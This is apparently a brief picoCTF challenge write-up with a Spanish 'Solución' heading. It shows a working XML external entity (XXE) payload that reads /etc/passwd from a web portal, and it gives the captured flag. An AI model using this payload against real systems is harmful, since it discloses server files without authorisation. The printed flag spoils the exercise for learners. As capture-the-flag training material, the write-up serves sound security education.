The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:50946/)

Hints: XML external entity Injection


# Solución 

````
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
	<data><ID>
		&xxe;
	</ID></data>

picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}


```
